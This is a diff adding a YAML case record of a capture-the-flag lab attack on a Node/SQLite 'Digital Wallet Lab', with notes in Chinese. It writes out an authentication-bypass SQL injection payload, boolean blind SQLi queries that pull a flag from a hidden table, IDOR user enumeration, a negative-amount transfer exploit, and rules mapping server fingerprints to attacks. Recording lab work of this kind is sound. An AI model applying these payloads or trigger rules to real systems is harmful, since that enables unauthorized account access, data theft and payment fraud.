@@ -1,0 +1,87 @@
+# 案例: Digital Wallet Lab (SQLi + IDOR CTF)
+# 日期: 2026-07-20
+# 目标: http://203.0.113.10:30074
+
+target:
+  url: "http://203.0.113.10:30074"
+  type: ctf
+  name: "Digital Wallet Lab"
+  tech_stack:
+    - "Express (Node.js)"
+    - "Vuetify 3 (Vue.js SPA)"
+    - "Vite 构建"
+    - "SQLite 数据库"
+  ports: [30074]
+  fingerprint:
+    server_header: "X-Powered-By: Express"
+    cors: "Access-Control-Allow-Origin: *"
+    content_type: "text/html; charset=UTF-8"
+    is_spa: true
+    js_bundle: "/assets/index-Cq7aS2Y4.js (660KB)"
+    auth_type: "JWT (HS256)"
+    auth_storage: "localStorage wallet_token"
+
+attack_surface:
+  - "/api/login (POST) - 登录端点"
+  - "/api/user/:id - 用户信息 (IDOR)"
+  - "/api/transfer - 转账功能"
+  - "/api/transactions - 交易记录"
+  - "/api/balance - 余额查询"
+  - "/api/profile - 个人资料"
+  - "JS bundle 含完整前端路由和 API 调用"
+
+techniques_tried:
+  - technique: "JS 逆向 (搜 API 路由)"
+    result: "found_routes"
+    detail: "发现 /api/login, /api/user/:id, /api/transfer, /api/transactions"
+  - technique: "弱口令爆破"
+    result: "failed"
+  - technique: "万能密码 SQLi (username=' OR '1'='1)"
+    result: "success"
+    detail: "登录为 admin (id:6, balance:999999.99, role:admin)"
+  - technique: "IDOR 枚举"
+    result: "success"
+    detail: "/api/user/1-6 全部可访问，无需权限校验"
+  - technique: "Blind SQLi (布尔盲注)"
+    result: "success"
+    detail: "提取 sqlite_master → 发现隐藏表 flags"
+  - technique: "Blind SQLi (逐字符提取)"
+    result: "success"
+    detail: "提取 flags.flag_value"
+  - technique: "负金额转账"
+    result: "business_logic_bug"
+    detail: "amount=-999999 → 余额反向增加"
+
+success_path:
+  - step: 1
+    action: "JS bundle 逆向 → 提取 API 路由"
+  - step: 2
+    action: "POST /api/login 万能密码注入"
+    payload: "{\"username\":\"admin' OR '1'='1\",\"password\":\"x\"}"
+    finding: "管理员 token + JWT (HS256, role:admin)"
+  - step: 3
+    action: "IDOR 枚举 /api/user/1-6"
+    finding: "6 个用户信息泄露"
+  - step: 4
+    action: "Blind SQLi 布尔盲注 → 发现 flags 表"
+    payload: "admin' AND (SELECT COUNT(*) FROM flags)=1--"
+  - step: 5
+    action: "逐字符盲注提取 flag_value"
+    payload: "admin' AND (SELECT SUBSTR(flag_value,N,1) FROM flags)='X'--"
+    flag: "CTF{w4llet_1dor_sqli_bu51ness_l0g1c}"
+
+techniques_learned:
+  - "Express SPA: JS bundle 逆向必做 (搜 baseURL/api/fetch)"
+  - "万能密码 SQLi: username=' OR '1'='1 在 Node+SQLite 中有效"
+  - "Boolean-based blind SQLi: 用登录成功/失败作为 Oracle"
+  - "IDOR: RESTful /api/user/:id 常缺权限校验"
+  - "业务逻辑: 负金额转账可绕过余额检查"
+  - "sqlite_master 可枚举所有表和结构"
+  - "pragma_table_info('table') 可枚举列名"
+
+fingerprint_triggers:
+  - "X-Powered-By: Express + SPA → JS 逆向 + API 模糊"
+  - "POST /api/login 返回 JWT → SQLi 测试登录点"
+  - "RESTful /api/user/:id → IDOR 枚举"
+  - "转账/支付功能 → 负金额/零金额/超大金额测试"
+  - "SQLite 后端 → sqlite_master 枚举 + 布尔盲注"
